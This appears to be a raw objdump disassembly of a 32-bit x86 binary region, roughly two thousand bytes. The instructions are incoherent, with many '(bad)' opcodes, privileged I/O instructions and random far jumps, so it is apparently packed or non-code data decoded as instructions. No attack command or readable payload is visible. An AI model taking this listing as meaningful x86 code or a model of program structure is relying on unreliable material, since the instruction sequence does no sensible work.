  4169e7:	push   edx
  4169e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169e9:	fnstenv [esi]
  4169eb:	out    dx,eax
  4169ec:	mul    DWORD PTR [edx-0x75]
  4169ef:	sub    BYTE PTR [ebx],0xc9
  4169f2:	sahf   
  4169f3:	lods   al,BYTE PTR ds:[esi]
  4169f4:	loopne 0x4169c2
  4169f6:	test   cl,cl
  4169f8:	jnp    0x416a31
  4169fa:	cs jb  0x4169ee
  4169fd:	dec    ebx
  4169fe:	inc    ebp
  4169ff:	lea    edx,ds:0x7ab2031f
  416a05:	ror    DWORD PTR [esi+0xc711505],cl
  416a0b:	ins    BYTE PTR es:[edi],dx
  416a0c:	int3   
  416a0d:	cmc    
  416a0e:	mov    ecx,0x3be70aca
  416a13:	add    BYTE PTR [esi-0x34f1c492],bl
  416a19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a1a:	jae    0x416a32
  416a1c:	sub    al,0x9d
  416a1e:	scas   al,BYTE PTR es:[edi]
  416a1f:	(bad)  
  416a20:	and    al,0x31
  416a22:	scas   eax,DWORD PTR es:[edi]
  416a23:	jle    0x416a3c
  416a25:	in     al,0xa
  416a27:	bound  esp,QWORD PTR [ecx]
  416a29:	push   es
  416a2a:	in     al,0xe8
  416a2c:	test   DWORD PTR [edi-0x6e],esi
  416a2f:	and    ch,ch
  416a31:	int    0x43
  416a33:	jb     0x4169f1
  416a35:	and    bl,dh
  416a37:	push   esp
  416a38:	(bad)  [ebx]
  416a3a:	ror    DWORD PTR [ecx],1
  416a3c:	into   
  416a3d:	xor    BYTE PTR [esi+0x3942d2e7],bh
  416a43:	xchg   ebx,eax
  416a44:	fld    QWORD PTR [edx+0x18]
  416a47:	and    BYTE PTR [esi-0x56],dh
  416a4a:	std    
  416a4b:	js     0x416a1e
  416a4d:	in     al,dx
  416a4e:	xor    ebx,DWORD PTR [edx+ebp*4+0x77cc4257]
  416a55:	pop    ds
  416a56:	mov    bl,bl
  416a58:	mov    ebp,0xabbf1c1e
  416a5d:	call   0xf87d37a8
  416a62:	add    dh,0x1b
  416a65:	jbe    0x416a75
  416a67:	fild   DWORD PTR [edi]
  416a69:	xchg   ecx,eax
  416a6a:	mov    gs,WORD PTR [edx+ebp*8]
  416a6d:	cmp    edi,DWORD PTR [ecx+eax*8+0x13ef5ae3]
  416a74:	popa   
  416a75:	test   BYTE PTR [ebx+0x30],al
  416a78:	(bad)  
  416a79:	hlt    
  416a7a:	cmp    DWORD PTR [eax],0x17
  416a7d:	inc    esp
  416a7e:	jns    0x416acb
  416a80:	rcl    DWORD PTR [edx-0xd],cl
  416a83:	jb     0x416a95
  416a85:	sub    al,0x69
  416a87:	mov    eax,0x8b059baa
  416a8c:	js     0x416ac2
  416a8e:	cmp    edi,esi
  416a90:	stos   DWORD PTR es:[edi],eax
  416a91:	mov    ecx,esi
  416a93:	sbb    dh,cl
  416a95:	dec    esp
  416a96:	push   0xb6fed910
  416a9b:	into   
  416a9c:	xor    DWORD PTR [ebx],0xb
  416a9f:	mov    al,ds:0x491f36c7
  416aa4:	fstp   QWORD PTR [ecx+0x44]
  416aa7:	push   eax
  416aa8:	xchg   ebx,eax
  416aa9:	dec    ebx
  416aaa:	and    ah,BYTE PTR [eax-0x4]
  416aad:	cs jmp 0x416a9c
  416ab0:	xchg   BYTE PTR [esi+0x6ccc0c94],al
  416ab6:	int    0x91
  416ab8:	fistp  WORD PTR [esi+0x4c87670a]
  416abe:	int    0xb9
  416ac0:	mov    ebp,0x7fbcf7b3
  416ac5:	sahf   
  416ac6:	cmp    dh,BYTE PTR [esi+0x77672051]
  416acc:	dec    esi
  416acd:	adc    esp,DWORD PTR [esi-0xb24f646]
  416ad3:	std    
  416ad4:	mov    esi,0xcab83705
  416ad9:	shr    BYTE PTR [ebx-0x12],cl
  416adc:	retf   0xa4ef
  416adf:	push   edi
  416ae0:	adc    BYTE PTR [ebx],bl
  416ae2:	xlat   BYTE PTR ds:[ebx]
  416ae3:	pushf  
  416ae4:	outs   dx,BYTE PTR ds:[esi]
  416ae5:	cmp    dl,BYTE PTR [esi]
  416ae7:	mov    edx,0x1be2f2bb
  416aec:	push   es
  416aed:	fwait
  416aee:	dec    esp
  416aef:	daa    
  416af0:	lods   al,BYTE PTR ds:[esi]
  416af1:	shl    BYTE PTR [esi+0x4],cl
  416af4:	arpl   WORD PTR [eax-0x58d21dad],bx
  416afa:	stos   DWORD PTR es:[edi],eax
  416afb:	loopne 0x416ab3
  416afd:	or     edi,DWORD PTR [edx-0x789a9f7f]
  416b03:	fiadd  DWORD PTR [eax+esi*4+0x70]
  416b07:	adc    DWORD PTR [eax],edi
  416b09:	or     ecx,DWORD PTR ds:0xb86be0e1
  416b0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b10:	(bad)  
  416b11:	pushf  
  416b12:	xchg   ebx,eax
  416b13:	push   eax
  416b14:	inc    ebp
  416b15:	or     eax,0xd6dd4a60
  416b1a:	ss sub eax,0x27963ade
  416b20:	dec    esi
  416b21:	out    0x6,eax
  416b23:	rol    DWORD PTR [edi+ecx*1-0x495cb72d],1
  416b2a:	loope  0x416aee
  416b2c:	aad    0xbd
  416b2e:	sub    eax,0x9d7dd438
  416b33:	in     eax,0x6e
  416b35:	sub    BYTE PTR [esi+0x70],0xe3
  416b39:	pop    ebp
  416b3a:	leave  
  416b3b:	pop    ecx
  416b3c:	adc    ah,0xcd
  416b3f:	jns    0x416b35
  416b41:	in     al,dx
  416b42:	inc    edi
  416b43:	push   ebp
  416b44:	adc    dh,BYTE PTR [ebx+0x39569570]
  416b4a:	mov    DWORD PTR [ecx-0x66d4517d],edx
  416b50:	ins    DWORD PTR es:[edi],dx
  416b51:	push   eax
  416b52:	test   al,0x65
  416b54:	mov    al,ds:0xf1675bb0
  416b59:	jae    0x416b48
  416b5b:	xor    al,0xe3
  416b5d:	stc    
  416b5e:	mov    ?,WORD PTR [ebx-0x74885f73]
  416b64:	jmp    0xc7dd:0x6627de6e
  416b6b:	mov    dh,0x51
  416b6d:	jb     0x416b99
  416b6f:	pushf  
  416b70:	add    al,0xac
  416b72:	dec    edi
  416b73:	mov    BYTE PTR cs:[ecx],bl
  416b76:	aaa    
  416b77:	dec    eax
  416b78:	repz jge 0x416b07
  416b7b:	pop    ds
  416b7c:	push   0xfffffff1
  416b7e:	add    BYTE PTR [esi+0x6a],cl
  416b81:	xor    cl,BYTE PTR [edi+edi*1+0x6b]
  416b85:	outs   dx,BYTE PTR ds:[esi]
  416b86:	inc    edi
  416b87:	xor    ah,BYTE PTR [ecx+ecx*2+0x49e045fd]
  416b8e:	aad    0xe2
  416b90:	xchg   esp,eax
  416b91:	mov    edi,0xa5c2715c
  416b96:	sub    BYTE PTR [eax],cl
  416b98:	fdivr  st(6),st
  416b9a:	add    al,0x56
  416b9c:	xchg   DWORD PTR [ebx+0xc2e1a8b],esp
  416ba2:	test   eax,0x35633f4f
  416ba7:	mov    dh,0xa2
  416ba9:	mov    ch,0xcc
  416bab:	call   0x78ad5b0e
  416bb0:	cmp    al,0x7a
  416bb2:	and    BYTE PTR [ebx+0xc15a1d9],al
  416bb8:	stos   DWORD PTR es:[edi],eax
  416bb9:	jmp    0xacc1:0x49d56d0c
  416bc0:	pop    ebp
  416bc1:	gs mov cl,0x8f
  416bc4:	sub    eax,0x32e6036b
  416bc9:	sub    eax,DWORD PTR [esi]
  416bcb:	xchg   BYTE PTR [edx-0x7f80e9f1],al
  416bd1:	out    0x0,al
  416bd3:	push   ebp
  416bd4:	imul   eax,DWORD PTR [ebx-0x768da11a],0xffffff81
  416bdb:	stc    
  416bdc:	pop    ss
  416bdd:	sub    bh,BYTE PTR [ecx+0x520cab62]
  416be3:	test   BYTE PTR [esi+0x1cc24903],dl
  416be9:	sbb    al,BYTE PTR [edi-0x6d]
  416bec:	jae    0x416bea
  416bee:	mov    WORD PTR [ecx-0x58],gs
  416bf1:	shl    DWORD PTR [ebp-0x3860c41a],cl
  416bf7:	fidivr WORD PTR [ebx]
  416bf9:	repz xchg esi,eax
  416bfb:	jnp    0x416c16
  416bfd:	in     eax,0x7f
  416bff:	cld    
  416c00:	jmp    0xf047:0x89572778
  416c07:	jecxz  0x416c12
  416c09:	pop    ecx
  416c0a:	out    dx,eax
  416c0b:	cmc    
  416c0c:	jne    0x416c15
  416c0e:	shl    DWORD PTR [eax-0x5d],0x59
  416c12:	not    cl
  416c14:	cs in  eax,dx
  416c16:	gs dec ebx
  416c18:	adc    edi,ecx
  416c1a:	ror    DWORD PTR [ecx+0x33],0xb6
  416c1e:	dec    eax
  416c1f:	lods   al,BYTE PTR ds:[esi]
  416c20:	(bad)  
  416c21:	repz dec ebp
  416c23:	inc    esi
  416c24:	popf   
  416c25:	and    ecx,edi
  416c27:	shl    BYTE PTR [edi-0x4b],1
  416c2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c2b:	mov    edi,0x7de16e2d
  416c30:	xchg   BYTE PTR [esi],cl
  416c32:	cwde   
  416c33:	(bad)  
  416c35:	ja     0x416c0a
  416c37:	or     eax,DWORD PTR [ebx]
  416c39:	inc    esp
  416c3a:	inc    esi
  416c3b:	hlt    
  416c3c:	inc    edx
  416c3d:	sbb    esi,DWORD PTR [ecx]
  416c3f:	jmp    0xef0f:0x8111bdc9
  416c46:	add    esp,DWORD PTR [ecx+0x58]
  416c49:	neg    al
  416c4b:	ret    
  416c4c:	sbb    esi,0x59b2d209
  416c52:	sti    
  416c53:	pop    esi
  416c54:	mov    ds:0x35135508,eax
  416c59:	aam    0x9
  416c5b:	push   edx
  416c5c:	cmp    BYTE PTR [ebp+0x1ca5f230],ch
  416c62:	fdivr  DWORD PTR [eax-0x2e]
  416c65:	mov    ds:0xbd664685,eax
  416c6a:	and    eax,0xe7da2693
  416c6f:	pop    edi
  416c70:	xor    ch,BYTE PTR [edi-0x689f8082]
  416c76:	stos   BYTE PTR es:[edi],al
  416c77:	xor    dl,ch
  416c79:	test   DWORD PTR [edx-0x3c084c64],ebx
  416c7f:	add    al,BYTE PTR [ebp+0x13124572]
  416c85:	test   al,0x30
  416c87:	nop
  416c88:	adc    DWORD PTR [edx],eax
  416c8a:	test   DWORD PTR ds:0x18bce57c,ebp
  416c90:	mul    BYTE PTR [edi+0x56889d3e]
  416c96:	sar    BYTE PTR [edi+0x7f],0xcb
  416c9a:	rcr    DWORD PTR [eax+0x484ecbfe],cl
  416ca0:	leave  
  416ca1:	dec    esi
  416ca2:	inc    edx
  416ca3:	fstp   DWORD PTR [edx-0x27343b1c]
  416ca9:	push   ebx
  416caa:	(bad)
  416cad:	jge    0x416d03
  416caf:	push   edx
  416cb0:	mov    dh,0xab
  416cb2:	and    eax,0x2b9d32c0
  416cb7:	xchg   edx,eax
  416cb8:	inc    esp
  416cb9:	sbb    eax,0xf0869629
  416cbe:	mov    esi,0x801029de
  416cc3:	push   esi
  416cc4:	or     ebp,esp
  416cc6:	push   es
  416cc7:	fisub  WORD PTR [esp+esi*2]
  416cca:	js     0x416d02
  416ccc:	push   es
  416ccd:	iret   
  416cce:	fistp  WORD PTR [edx]
  416cd0:	shl    DWORD PTR [esi-0x5e],0xab
  416cd4:	in     al,0xdf
  416cd6:	stos   BYTE PTR es:[edi],al
  416cd7:	aam    0x7c
  416cd9:	ror    DWORD PTR [ebp-0x1473731d],0xa3
  416ce0:	jne    0x416c78
  416ce2:	inc    ecx
  416ce3:	enter  0x535f,0xf8
  416ce7:	pushf  
  416ce8:	sbb    al,BYTE PTR [edi]
  416cea:	xchg   esi,eax
  416ceb:	ds sbb esi,eax
  416cee:	inc    edi
  416cef:	adc    DWORD PTR [esi+0x763d8892],ebx
  416cf5:	mov    ecx,0x5ef36851
  416cfa:	jne    0x416d11
  416cfc:	sub    BYTE PTR ds:[ebx-0x70],0x24
  416d01:	loop   0x416d53
  416d03:	cmp    ebx,esi
  416d05:	dec    eax
  416d06:	pop    ds
  416d07:	jne    0x416d4a
  416d09:	or     al,0x87
  416d0b:	mov    ebx,0x6547f8d4
  416d10:	in     al,dx
  416d11:	fstp   QWORD PTR [ecx+0x7e0c9d38]
  416d17:	je     0x416cf2
  416d19:	out    0xa5,eax
  416d1b:	scas   al,BYTE PTR es:[edi]
  416d1c:	pop    esp
  416d1d:	lds    esi,FWORD PTR [ebx+0x703eb50e]
  416d23:	leave  
  416d24:	push   0xfffffff4
  416d26:	loop   0x416cfa
  416d28:	mov    dl,0xd2
  416d2a:	ss int 0x29
  416d2d:	jp     0x416d45
  416d2f:	retf   
  416d30:	sbb    bl,BYTE PTR [esi+0x4b]
  416d33:	ja     0x416d36
  416d35:	sbb    eax,0xfa3ed8b5
  416d3a:	test   DWORD PTR [edx+edi*8+0x3724262e],ecx
  416d41:	je     0x416cda
  416d43:	ins    DWORD PTR es:[edi],dx
  416d44:	pop    esi
  416d45:	lods   al,BYTE PTR ds:[esi]
  416d46:	sbb    eax,0x71653f07
  416d4b:	fwait
  416d4c:	popf   
  416d4d:	adc    al,0x1
  416d4f:	sbb    DWORD PTR [ecx+edx*4+0x166e917d],ebx
  416d56:	and    al,0x6
  416d58:	ja     0x416d04
  416d5a:	je     0x416dd3
  416d5c:	dec    eax
  416d5d:	pop    eax
  416d5e:	sub    DWORD PTR [edx],edi
  416d60:	push   ebp
  416d61:	mov    al,ds:0x1be2b5a2
  416d66:	cmp    BYTE PTR [eax],ch
  416d68:	and    bl,BYTE PTR [esi+0x36f96a24]
  416d6e:	outs   dx,BYTE PTR ds:[esi]
  416d6f:	fild   WORD PTR [esi]
  416d71:	inc    ebx
  416d72:	dec    ebx
  416d73:	jmp    0x416d80
  416d75:	lds    edx,FWORD PTR [ecx]
  416d77:	dec    esp
  416d78:	push   eax
  416d79:	rcr    DWORD PTR ds:[edx-0x5e],cl
  416d7d:	je     0x416dc4
  416d7f:	sub    ch,0x9d
  416d82:	retf   
  416d83:	or     dh,bl
  416d85:	xchg   esp,eax
  416d86:	mov    bl,BYTE PTR [edi+esi*8+0x6f]
  416d8a:	and    BYTE PTR [edx],dh
  416d8c:	fdivr  QWORD PTR [ecx-0x506172ec]
  416d92:	icebp  
  416d93:	lea    esp,[ebp-0x4ade5101]
  416d99:	test   DWORD PTR [ebx],esi
  416d9b:	lock out dx,eax
  416d9d:	xchg   esi,eax
  416d9e:	aas    
  416d9f:	cmp    DWORD PTR [edx+0x61977b91],eax
  416da5:	(bad)
  416da8:	xor    edi,DWORD PTR [esi+edx*8-0x46]
  416dac:	pop    ecx
  416dad:	cdq    
  416dae:	popf   
  416daf:	sub    DWORD PTR gs:[edx+0x4d36cd22],0x2435c0da
  416dba:	ins    DWORD PTR es:[edi],dx
  416dbb:	inc    esi
  416dbc:	das    
  416dbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416dbe:	push   ds
  416dbf:	clc    
  416dc0:	dec    esi
  416dc1:	pop    ds
  416dc2:	cmp    al,0x88
  416dc4:	xchg   DWORD PTR [esi+0x68],ecx
  416dc7:	sbb    DWORD PTR [esi-0x27],ebp
  416dca:	arpl   WORD PTR [edx],bx
  416dcc:	sahf   
  416dcd:	xchg   BYTE PTR [ebx-0x53],ah
  416dd0:	dec    esi
  416dd1:	pop    esp
  416dd2:	jb     0x416ddd
  416dd4:	jbe    0x416d7f
  416dd6:	mov    DWORD PTR [edi],eax
  416dd8:	test   eax,0x98a76aa5
  416ddd:	ds xchg esi,eax
  416ddf:	push   cs
  416de0:	dec    esp
  416de1:	or     cl,BYTE PTR [ebx+0x16]
  416de4:	sbb    ebp,ebp
  416de6:	xchg   edi,eax
  416de7:	xchg   esp,eax
  416de8:	or     esp,DWORD PTR [esi+0x69]
  416deb:	leave  
  416dec:	je     0x416dcd
  416dee:	loop   0x416e55
  416df0:	jg     0x416d89
  416df2:	(bad)  
  416df3:	into   
  416df4:	(bad)
  416df9:	scas   al,BYTE PTR es:[edi]
  416dfa:	aaa    
  416dfb:	push   es
  416dfc:	jge    0x416e41
  416dfe:	jae    0x416da3
  416e00:	sbb    ebx,ebx
  416e02:	loope  0x416d93
  416e04:	clc    
  416e05:	loope  0x416dfb
  416e07:	fmul   st,st(0)
  416e09:	es lahf 
  416e0b:	inc    edi
  416e0c:	cld    
  416e0d:	pop    ebx
  416e0e:	or     al,0xf8
  416e10:	je     0x416e90
  416e12:	adc    eax,esi
  416e14:	jnp    0x416e18
  416e16:	push   ds
  416e17:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e19:	sbb    DWORD PTR [ebp+0x3f4675cf],ebp
  416e1f:	push   eax
  416e20:	ja     0x416dbc
  416e22:	xchg   esp,eax
  416e23:	lods   al,BYTE PTR ds:[esi]
  416e24:	in     eax,dx
  416e25:	adc    DWORD PTR [ebx+esi*1+0x26fd5e89],ebx
  416e2c:	and    bh,BYTE PTR ds:0x9ac3782a
  416e32:	and    eax,0xaf2697
  416e37:	pop    esp
  416e38:	pop    edi
  416e39:	inc    ecx
  416e3a:	in     eax,dx
  416e3b:	sbb    BYTE PTR [eax+0x3e],al
  416e3e:	aas    
  416e3f:	jle    0x416e3d
  416e41:	adc    bl,bh
  416e43:	data16 jmp 0x416ebe
  416e46:	push   cs
  416e47:	ja     0x416e30
  416e49:	or     bl,bl
  416e4b:	inc    edi
  416e4c:	or     BYTE PTR [ecx+0xaaa7274],al
  416e52:	sub    bl,dh
  416e54:	stc    
  416e55:	dec    ebp
  416e56:	sbb    BYTE PTR [ebp+0x64],dl
  416e59:	jmp    0x30e5:0xe9fbfe8b
  416e60:	sbb    BYTE PTR [edi+0x7],0x27
  416e64:	add    eax,0x39993333
  416e69:	pusha  
  416e6a:	dec    eax
  416e6b:	fisubr DWORD PTR [esi+0x22a616a6]
  416e71:	(bad)  
  416e72:	and    al,0xdb
  416e74:	dec    edx
  416e75:	mov    esp,0xdc2426f0
  416e7a:	sub    ebp,DWORD PTR [ecx+0x14073228]
  416e80:	ins    BYTE PTR es:[edi],dx
  416e81:	pop    ss
  416e82:	stos   BYTE PTR es:[edi],al
  416e83:	test   DWORD PTR [eax],edi
  416e85:	mov    edi,0xc77638c2
  416e8a:	stc    
  416e8b:	jg     0x416e9d
  416e8d:	cmp    dl,BYTE PTR [ebx]
  416e8f:	cmp    BYTE PTR [ecx-0x17],al
  416e92:	lea    edx,[eax-0x1e]
  416e95:	pop    eax
  416e96:	xor    eax,0x6af3025a
  416e9b:	xor    al,0x78
  416e9d:	mov    WORD PTR [esi+0x4a0bcda],ds
  416ea3:	leave  
  416ea4:	push   cs
  416ea5:	pop    ebx
  416ea6:	push   ebp
  416ea7:	add    al,0xf6
  416ea9:	enter  0x5f5a,0x88
  416ead:	fnsave [edi]
  416eaf:	adc    BYTE PTR [edi+edx*1-0x4f],0x1f
  416eb4:	pop    ss
  416eb5:	adc    BYTE PTR [eax],0x47
  416eb8:	mov    edx,0x845bda74
  416ebd:	xchg   ebx,eax
  416ebe:	xchg   esp,eax
  416ebf:	push   ebx
  416ec0:	pop    eax
  416ec1:	mov    ebp,0x92548ca1
  416ec6:	xchg   ecx,eax
  416ec7:	dec    edx
  416ec8:	shl    edi,cl
  416eca:	mov    ah,bh
  416ecc:	cmp    ch,ch
  416ece:	push   esp
  416ecf:	sar    DWORD PTR [eax],0xab
  416ed2:	imul   BYTE PTR [edx]
  416ed4:	and    eax,0x6ee61ef7
  416ed9:	call   0x5d5f2ec8
  416ede:	adc    al,0x20
  416ee0:	call   0x5e579790
  416ee5:	xchg   ebx,eax
  416ee6:	call   0x40b47ead
  416eeb:	cs sbb eax,0x7a220dd2
  416ef1:	lds    ebx,FWORD PTR [ecx+0x38]
  416ef4:	test   al,0xa8
  416ef6:	int3   
  416ef7:	push   ds
  416ef8:	xchg   esi,eax
  416ef9:	cmp    esi,DWORD PTR [ecx+0x52334d2a]
  416eff:	mov    al,0x8b
  416f01:	ror    ebx,cl
  416f03:	dec    edi
  416f04:	scas   al,BYTE PTR es:[edi]
  416f05:	push   esp
  416f06:	sub    eax,0x1548484b
  416f0b:	pop    edx
  416f0c:	mov    ebx,DWORD PTR [eax+0x51e1c591]
  416f12:	lds    esi,FWORD PTR [ecx-0x5061ab15]
  416f18:	push   esi
  416f19:	adc    al,0x13
  416f1b:	outs   dx,BYTE PTR ds:[esi]
  416f1c:	xor    ch,BYTE PTR [edi]
  416f1e:	enter  0x43ba,0x4d
  416f22:	sti    
  416f23:	(bad)  
  416f24:	or     eax,0x9a7a405e
  416f29:	dec    edx
  416f2a:	xor    DWORD PTR [edi+0x3],esi
  416f2d:	mov    ecx,0x7e642b2c
  416f32:	sub    eax,0xac848d15
  416f37:	fwait
  416f38:	xchg   ecx,eax
  416f39:	inc    edi
  416f3a:	dec    eax
  416f3b:	stc    
  416f3c:	sub    ebx,DWORD PTR [ecx]
  416f3e:	repnz mov ds:0x559502c0,eax
  416f44:	mov    ebx,DWORD PTR [edx+0x2]
  416f47:	neg    ebx
  416f49:	outs   dx,DWORD PTR ds:[esi]
  416f4a:	retf   
  416f4b:	adc    BYTE PTR [edi+ecx*8+0x50cb89d2],dl
  416f52:	jb     0x416f05
  416f54:	jae    0x416fce
  416f56:	or     al,0x50
  416f58:	inc    esi
  416f59:	je     0x416f75
  416f5b:	inc    ecx
  416f5c:	das    
  416f5d:	mov    ebp,DWORD PTR [ebx-0x5]
  416f60:	dec    esi
  416f61:	or     dh,dh
  416f63:	push   ebx
  416f64:	imul   esi,DWORD PTR [ecx+ebx*8],0xec6a905c
  416f6b:	push   0x71
  416f6d:	pop    eax
  416f6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f6f:	loopne 0x416f15
  416f71:	inc    ebx
  416f72:	add    ebp,DWORD PTR [ecx+0x4ef70367]
  416f78:	mov    ebx,0xd43ff2cb
  416f7d:	test   eax,0xbf20a133
  416f82:	ds xchg ecx,eax
  416f84:	cmp    ebp,ecx
  416f86:	test   BYTE PTR [ebx-0x72],0x29
  416f8a:	jle    0x416fd7
  416f8c:	mov    esi,fs
  416f8e:	xchg   BYTE PTR [ebp-0x5e],dl
  416f91:	out    dx,eax
  416f92:	clc    
  416f93:	nop
  416f94:	push   0x5001c2e2
  416f99:	mov    ss,WORD PTR [ebx-0x3732a2cb]
  416f9f:	aas    
  416fa0:	xor    dh,BYTE PTR [ecx-0x59]
  416fa3:	jmp    DWORD PTR [ebp+0x65fb0027]
  416fa9:	les    ebp,FWORD PTR [edx-0x4bc145e7]
  416faf:	stos   BYTE PTR es:[edi],al
  416fb0:	mov    ebx,0xf419fdda
  416fb5:	mov    bl,BYTE PTR [ecx+0x7bfea455]
  416fbb:	inc    ecx
  416fbc:	in     eax,dx
  416fbd:	stos   DWORD PTR es:[edi],eax
  416fbe:	push   ecx
  416fbf:	out    dx,eax
  416fc0:	call   0x1925:0xaf0bcfd3
  416fc7:	jmp    0x416fb6
  416fc9:	and    DWORD PTR [edx+edx*1],0xf727895c
  416fd0:	retf   
  416fd1:	xor    eax,eax
  416fd3:	fmul   DWORD PTR [edi]
  416fd5:	mov    edi,0x2ee07b08
  416fda:	sbb    dh,BYTE PTR [esi]
  416fdc:	aam    0x8
  416fde:	mov    edi,0x18542e7f
  416fe3:	aas    
  416fe4:	mov    WORD PTR [eax-0x3c2a0146],gs
  416fea:	les    edi,FWORD PTR [eax+0x6a]
  416fed:	fs jo  0x417012
  416ff0:	mov    eax,0x4f4f10aa
  416ff5:	sbb    DWORD PTR [esi+edx*4-0x2d8d26bc],0xffffffcb
  416ffd:	xchg   esp,eax
  416ffe:	push   ebp
  416fff:	not    DWORD PTR [edx-0x66]
  417002:	(bad)  
  417003:	and    eax,0xe1a6b281
  417008:	add    DWORD PTR [edx+0x10],edx
  41700b:	mov    ecx,0xb5d68968
  417010:	or     eax,0x4f811591
  417015:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417016:	push   edi
  417017:	rcr    dl,cl
  417019:	pop    ecx
  41701a:	(bad)  
  41701c:	xchg   BYTE PTR ds:0x540c4787,cl
  417022:	inc    esi
  417023:	lds    esp,FWORD PTR [edx+0x36efa761]
  417029:	xchg   esi,eax
  41702a:	or     edi,DWORD PTR [ebx-0x6]
  41702d:	test   BYTE PTR [edx+0x5c1ef267],0xcf
  417034:	mov    ebx,0x22df3fe3
  417039:	fadd   DWORD PTR [ecx-0x2c]
  41703c:	lods   al,BYTE PTR ds:[esi]
  41703d:	cmp    dl,BYTE PTR [eax-0x37]
  417040:	and    eax,0xaa01a09
  417045:	jae    0x417078
  417047:	jmp    0x417013
  417049:	into   
  41704a:	out    0x46,eax
  41704c:	mov    cl,0xc2
  41704e:	es pusha 
  417050:	iret   
  417051:	fist   WORD PTR [ecx+0x7]
  417054:	inc    esi
  417055:	xor    al,0x67
  417057:	jb     0x4170c6
  417059:	jg     0x417072
  41705b:	jp     0x41705a
  41705d:	sbb    eax,0xf2a7e7e2
  417062:	(bad)  
  417063:	sbb    bh,BYTE PTR [ecx+0x5c9bf91]
  417069:	jmp    0xd934fd
  41706e:	lahf   
  41706f:	push   eax
  417070:	bound  ebp,QWORD PTR [edx]
  417072:	or     eax,0xe42b5f63
  417077:	call   0x7da7:0xac2ea1da
  41707e:	lods   eax,DWORD PTR ds:[esi]
  41707f:	jl     0x417096
  417081:	mov    eax,esp
  417083:	aas    
  417084:	pushf  
  417085:	dec    eax
  417086:	mov    ds:0x50a11297,eax
  41708b:	(bad)  
  41708c:	mov    al,0xf7
  41708e:	mov    ds:0x11ef907b,eax
  417093:	xlat   BYTE PTR ds:[ebx]
  417094:	or     BYTE PTR [eax+0x43c8c727],dh
  41709a:	call   0x5aa5:0x6efea808
  4170a1:	nop
  4170a2:	xor    edi,DWORD PTR [eax+0x45]
  4170a5:	dec    esi
  4170a6:	push   es
  4170a7:	ja     0x417047
  4170a9:	and    DWORD PTR [edi],eax
  4170ab:	cmc    
  4170ac:	dec    ebp
  4170ad:	rcr    BYTE PTR [eax-0x5b29f905],1
  4170b3:	mov    esp,0x1938881a
  4170b8:	add    esi,esi
  4170ba:	fnclex 
  4170bc:	in     al,0x99
  4170be:	nop
  4170bf:	cld    
  4170c0:	cmc    
  4170c1:	adc    BYTE PTR [edi-0x1ea987d6],bl
  4170c7:	mov    dh,0x47
  4170c9:	das    
  4170ca:	pop    ecx
  4170cb:	mov    ebp,0xa3f73ea1
  4170d0:	addr16 jmp 0x3adb:0x80a8f0d5
  4170d8:	fcomi  st,st(3)
  4170da:	out    dx,eax
  4170db:	jne    0x4170f5
  4170dd:	pop    eax
  4170de:	push   eax
  4170df:	(bad)  
  4170e1:	sbb    bh,BYTE PTR [ecx-0x394a1044]
  4170e7:	test   BYTE PTR [eax],0xeb
  4170ea:	adc    eax,0x509541e4
  4170ef:	wbinvd 
  4170f1:	push   ebx
  4170f2:	dec    ecx
  4170f3:	jae    0x4170e2
  4170f5:	jnp    0x41712a
  4170f7:	inc    ebp
  4170f8:	fcomp  DWORD PTR ds:[esi+0x79fd4209]
  4170ff:	adc    BYTE PTR [edi-0x3528b1ba],ah
  417105:	pusha  
  417106:	add    al,0xb7
  417108:	retf   
  417109:	enter  0x6e13,0x70
  41710d:	dec    ebp
  41710e:	mov    bh,BYTE PTR [ecx+0x57f0abbc]
  417114:	clc    
  417115:	mov    dh,cl
  417117:	cs mov ch,0x5b
  41711a:	outs   dx,BYTE PTR ds:[esi]
  41711b:	push   ebx
  41711c:	cmp    ecx,edi
  41711e:	imul   eax,DWORD PTR ds:0x4566dd1d,0x15
  417125:	lods   al,BYTE PTR ds:[esi]
  417126:	sub    esi,DWORD PTR [esi]
  417128:	inc    eax
  417129:	popa   
  41712a:	int3   
  41712b:	mov    cl,0x91
  41712d:	jecxz  0x4170b5
  41712f:	mov    eax,ds:0xe8c73959
  417134:	aad    0x8c
  417136:	jbe    0x4170c8
  417138:	frstor [edx+0x6db47601]
  41713e:	and    BYTE PTR [ebp+0x73],cl
  417141:	cmp    ebx,edi
  417143:	out    0x95,al
  417145:	xlat   BYTE PTR ds:[ebx]
  417146:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417147:	push   edi
  417148:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417149:	sbb    edi,DWORD PTR [ebx]
  41714b:	adc    eax,0x6596a089
  417150:	sbb    ch,BYTE PTR [esi-0x30]
  417153:	stos   BYTE PTR es:[edi],al
  417154:	in     al,dx
  417155:	fsubr  DWORD PTR [ecx-0x74]
  417158:	jbe    0x417129
  41715a:	sub    edx,DWORD PTR [ebx]
  41715c:	loop   0x417131
  41715e:	icebp  
  41715f:	adc    DWORD PTR [edx-0x64],eax
  417162:	or     eax,0xe513ba23
  417167:	jecxz  0x4171b2
  417169:	push   0xffffffd3
  41716b:	mov    bl,0x9b
  41716d:	cwde   
  41716e:	adc    al,0xdd
  417170:	shr    edx,0xe9
  417173:	out    0xa4,al
  417175:	dec    ebx
  417176:	dec    esp
  417177:	xor    BYTE PTR [ecx],ah
  417179:	add    eax,0x2499779e
  41717e:	dec    ebp
  41717f:	ss or  esi,esi
  417182:	xchg   esi,eax
  417183:	and    edi,DWORD PTR [ebp-0x1ba21f05]
  417189:	enter  0x8fed,0xe8
  41718d:	in     eax,0x89
  41718f:	jae    0x417119
  417191:	and    esp,DWORD PTR [ecx-0x14]
  417194:	push   0x74
  417196:	aaa    
  417197:	arpl   cx,bx
  417199:	stos   DWORD PTR es:[edi],eax
  41719a:	and    ah,BYTE PTR [esi]
  41719c:	loope  0x41712a
  41719e:	dec    esp
  41719f:	pop    eax
  4171a0:	ja     0x4171bf
  4171a2:	add    eax,0x992bae81
  4171a7:	rcl    ebx,1
  4171a9:	xchg   edi,eax
